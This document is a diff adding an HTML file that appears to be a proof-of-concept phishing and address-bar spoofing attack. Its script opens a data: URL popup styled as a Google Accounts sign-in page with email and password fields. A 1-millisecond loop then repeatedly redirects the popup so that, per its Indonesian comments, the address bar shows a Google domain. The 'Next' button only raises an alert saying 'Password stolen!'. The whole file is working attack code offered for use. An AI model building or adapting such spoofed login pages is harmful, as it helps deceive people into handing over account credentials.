@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Google Sign-In</title>
+  <style>
+    body { margin:0; height:100vh; background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; }
+    button { background:#4285f4; color:white; padding:16px 32px; font-size:18px; border:none; border-radius:8px; cursor:pointer; }
+  </style>
+</head>
+<body>
+
+<button onclick="spoof()">Sign in with Google</button>
+
+<script>
+function spoof() {
+  // LANGKAH 1: BUKA POPUP DENGAN data:text/html LANGSUNG
+  const win = window.open(
+    "data:text/html," + encodeURIComponent(`
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in – Google Accounts</title>
+  <style>
+    body { margin:0; padding:40px; font-family:'Google Sans',Arial,sans-serif; background:#fff; text-align:center; }
+    img { width:92px; margin-bottom:30px; }
+    h1 { font-size:24px; color:#333; }
+    input { width:100%; max-width:320px; padding:14px; margin:10px 0; border:1px solid #dadce0; border-radius:8px; font-size:16px; }
+    button { background:#1a73e8; color:white; border:none; padding:14px 32px; border-radius:8px; font-size:16px; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+  <h1>Sign in</h1>
+  <p>Use your Google Account</p>
+  <input type="email" placeholder="Email or phone" autocomplete="username">
+  <input type="password" placeholder="Password" autocomplete="current-password">
+  <br><br>
+  <button onclick="alert('Password stolen!')">Next</button>
+</body>
+</html>
+    `),
+    "_blank"
+  );
+
+  // LANGKAH 2: RACE LOOP — PAKSA ADDRESS BAR JADI https://accounts.google.com
+  setInterval(() => {
+    try {
+      win.location.replace("https://google.com:82");
+    } catch (e) {}
+  }, 1);
+}
+</script>
+
+</body>
+</html>
